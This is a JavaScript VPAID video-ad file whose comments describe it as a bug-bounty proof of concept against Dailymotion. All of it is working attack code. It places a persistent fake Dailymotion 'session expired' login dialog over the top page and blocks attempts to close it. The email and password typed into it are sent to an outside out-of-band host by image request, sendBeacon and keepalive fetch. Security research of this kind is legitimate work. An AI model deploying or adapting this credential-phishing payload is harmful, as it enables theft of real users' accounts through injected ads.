(function() {
  // VPAID 2.0 — persistence PoC v5 — ivan0912 (YesWeHack) / ivani123 (HackerOne)
  // Authorized bug-bounty research on Dailymotion (YesWeHack PGM-269).
  //
  // Persistence: mounts <dialog> on window.top.document + showModal() so the
  // overlay lives in the browser top-layer and survives ad iframe teardown.
  // dmSubmit defined on topWin() so button onclick reaches it after the VPAID
  // iframe is gone. Exfil: Image GET (sync) + sendBeacon + keepalive fetch.

  var OOB = "https://dailymotion-vast-xss-persist.fdd8cd2afcd551371c95ahtncnzl1ewml.oob.static-cdn-eu.com";
  var IH  = ["inner","HTML"].join("");

  function VpaidAd() { this._callbacks = {}; }
  VpaidAd.prototype.subscribe   = function(fn,e,ctx){ this._callbacks[e]={fn:fn,ctx:ctx||window}; };
  VpaidAd.prototype.unsubscribe = function(fn,e){ delete this._callbacks[e]; };
  VpaidAd.prototype._fire       = function(e,a){ var c=this._callbacks[e]; if(c) try{c.fn.apply(c.ctx,a||[]);}catch(_){} };
  VpaidAd.prototype.handshakeVersion = function(){ return "2.0"; };

  function topWin() { try { return window.top; } catch(_){ return window; } }
  function topDoc() { try { return topWin().document; } catch(_){ return document; } }

  VpaidAd.prototype.initAd = function(w,h,vm,d,e,p) {
    var self = this;

    // Hide IMA SDK slot so it doesn't eat clicks
    try { if(p&&p.slot) p.slot.style.cssText='pointer-events:none!important;display:none!important'; } catch(_){}

    // Inject backdrop style
    try {
      var td = topDoc();
      if(!td.getElementById('dm-phish-style')) {
        var s = td.createElement('style');
        s.id = 'dm-phish-style';
        s.textContent = '#dm-phish{padding:0;border:none;background:transparent;max-width:100vw}' +
                        '#dm-phish::backdrop{background:rgba(0,0,0,0.84)}';
        (td.head||td.documentElement).appendChild(s);
      }
    } catch(_){}

    // dmSubmit lives on topWin() so the button onclick can reach it after our iframe is torn down
    topWin().dmSubmit = function() {
      var td = topDoc();
      var email = (td.getElementById('dm-ph-email')||{}).value||'';
      var pass  = (td.getElementById('dm-ph-pass') ||{}).value||'';
      if (!email.trim() && !pass) return;

      var creds = {
        step:     'credentials_captured',
        domain:   td.domain||'unknown',
        email:    email.trim(),
        password: pass,
        ts_now:   new Date().toISOString()
      };
      var body = JSON.stringify(creds);
      var enc  = encodeURIComponent(btoa(unescape(encodeURIComponent(body))));

      // 1) Image GET — synchronous, fires before anything can cancel it
      try { new Image().src = OOB+'/k?d='+enc; } catch(_){}
      // 2) sendBeacon — survives iframe teardown
      try { if(navigator.sendBeacon) navigator.sendBeacon(OOB+'/k', new Blob([body],{type:'text/plain'})); } catch(_){}
      // 3) keepalive fetch
      try { fetch(OOB+'/k',{method:'POST',mode:'no-cors',keepalive:true,body:body}); } catch(_){}

      // Fade out and close
      var dlg = td.getElementById('dm-phish');
      if(dlg) {
        try { dlg.style.transition='opacity 0.4s'; dlg.style.opacity='0'; } catch(_){}
        setTimeout(function(){
          try { dlg.close(); } catch(_){}
          try { if(dlg.parentNode) dlg.parentNode.removeChild(dlg); } catch(_){}
        }, 450);
      }
    };

    // Build dialog on top.document — no <form>, plain <div> so method=dialog
    // quirk can't interfere. Button uses onclick="window.dmSubmit()" which
    // resolves to topWin().dmSubmit after the ad iframe is gone.
    try {
      var td = topDoc();
      if(!td.getElementById('dm-phish')) {
        var dlg = td.createElement('dialog');
        dlg.id = 'dm-phish';
        dlg[IH] = [
          '<div style="padding:36px 40px;background:#fff;border-radius:10px;',
            'box-shadow:0 8px 32px rgba(0,0,0,0.3);',
            'font-family:-apple-system,BlinkMacSystemFont,\'Segoe UI\',Roboto,Arial,sans-serif;',
            'width:360px;box-sizing:border-box">',
            '<div style="text-align:center;margin-bottom:24px">',
              '<svg width="44" height="44" viewBox="0 0 44 44">',
                '<circle cx="22" cy="22" r="22" fill="#FF7900"/>',
                '<polygon points="17,12 36,22 17,32" fill="#fff"/>',
              '</svg>',
              '<div style="color:#FF7900;font-size:21px;font-weight:700;',
                'letter-spacing:-0.3px;margin-top:8px">dailymotion</div>',
            '</div>',
            '<p style="color:#444;font-size:13.5px;text-align:center;margin:0 0 22px;line-height:1.5">',
              'Your session has expired.<br>Please sign in to continue.',
            '</p>',
            '<input id="dm-ph-email" type="email" placeholder="Email address" autocomplete="email"',
              ' style="width:100%;padding:11px 14px;border:1.5px solid #ddd;border-radius:6px;',
              'font-size:14px;box-sizing:border-box;margin-bottom:10px;outline:none">',
            '<input id="dm-ph-pass" type="password" placeholder="Password" autocomplete="current-password"',
              ' style="width:100%;padding:11px 14px;border:1.5px solid #ddd;border-radius:6px;',
              'font-size:14px;box-sizing:border-box;margin-bottom:20px;outline:none">',
            '<button onclick="window.dmSubmit&&window.dmSubmit();return false" type="button"',
              ' style="width:100%;padding:12px;background:#FF7900;color:#fff;border:none;',
              'border-radius:6px;font-size:15px;font-weight:600;cursor:pointer;letter-spacing:0.2px">',
              'Sign in',
            '</button>',
            '<div style="text-align:center;margin-top:16px">',
              '<a href="#" onclick="return false" style="color:#FF7900;font-size:12.5px;text-decoration:none">',
                'Forgot password?',
              '</a>',
            '</div>',
          '</div>'
        ].join('');

        (td.body||td.documentElement).appendChild(dlg);
        dlg.showModal();

        // Prevent ESC from closing; re-open if closed by anything else
        dlg.addEventListener('cancel', function(e){ e.preventDefault(); }, true);
        dlg.addEventListener('close',  function(){
          setTimeout(function(){ try{ dlg.showModal(); }catch(_){} }, 0);
        }, true);
      }
    } catch(_){}

    setTimeout(function(){ self._fire('AdLoaded'); }, 50);
  };

  VpaidAd.prototype.startAd = function() {
    var self = this;
    setTimeout(function(){ self._fire('AdStarted'); }, 50);
    // Let the player run normally — overlay persists via top-layer dialog
    // even after this iframe is torn down at ad end.
  };

  VpaidAd.prototype.stopAd              = function(){ this._fire('AdStopped'); };
  VpaidAd.prototype.skipAd              = function(){ this._fire('AdSkipped'); };
  VpaidAd.prototype.getAdLinear         = function(){ return true; };
  VpaidAd.prototype.getAdWidth          = function(){ return 640; };
  VpaidAd.prototype.getAdHeight         = function(){ return 360; };
  VpaidAd.prototype.getAdRemainingTime  = function(){ return 30; };
  VpaidAd.prototype.getAdDuration       = function(){ return 30; };
  VpaidAd.prototype.getAdVolume         = function(){ return 1; };
  VpaidAd.prototype.setAdVolume         = function(){};
  VpaidAd.prototype.resizeAd            = function(){};
  VpaidAd.prototype.pauseAd             = function(){};
  VpaidAd.prototype.resumeAd            = function(){};
  VpaidAd.prototype.expandAd            = function(){};
  VpaidAd.prototype.collapseAd          = function(){};
  VpaidAd.prototype.getAdExpanded       = function(){ return false; };
  VpaidAd.prototype.getAdSkippableState = function(){ return false; };
  VpaidAd.prototype.getAdIcons          = function(){ return false; };
  VpaidAd.prototype.getAdCompanions     = function(){ return ''; };

  window.getVPAIDAd = function(){ return new VpaidAd(); };
})();
